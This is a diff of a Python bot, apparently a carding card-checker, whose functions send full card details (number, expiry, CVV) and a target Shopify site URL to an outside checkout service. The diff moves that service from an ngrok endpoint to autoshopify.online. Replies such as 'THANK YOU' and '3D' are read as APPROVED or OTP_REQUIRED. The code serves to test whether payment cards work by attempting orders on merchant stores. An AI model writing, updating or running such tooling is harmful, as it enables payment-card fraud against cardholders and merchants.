@@ -1947,7 +1947,7 @@ def test_shopify_site(url):
         # Use the fixed test card instead of generating random one
         test_card = "5547300001996183|11|2028|197"
         
-        api_url = f"https://7feeef80303d.ngrok-free.app/autosh.php?cc={test_card}&site={url}"
+        api_url = f"https://autoshopify.online/index.php?site={url}&cc={test_card}"
         response = requests.get(api_url, timeout=100)
         
         if response.status_code != 200:
@@ -2118,7 +2118,7 @@ def check_shopify_cc(cc, site_info):
             pass
 
         # Make API request
-        api_url = f"https://7feeef80303d.ngrok-free.app/autosh.php?cc={formatted_cc}&site={site_info['url']}"
+        api_url = f"https://autoshopify.online/index.php?site={site_info['url']}&cc={formatted_cc}"
         response = requests.get(api_url, timeout=100)
         
         if response.status_code != 200:
@@ -2152,7 +2152,7 @@ def check_shopify_cc(cc, site_info):
                 if 'THANK YOU' in response_upper:
                     bot_response = 'ORDER CONFIRM!'
                     status = 'APPROVED'
-                elif '3DS' in response_upper:
+                elif '3D' in response_upper:
                     bot_response = 'OTP_REQUIRED'
                     status = 'APPROVED_OTP'
                 elif 'EXPIRED_CARD' in response_upper:
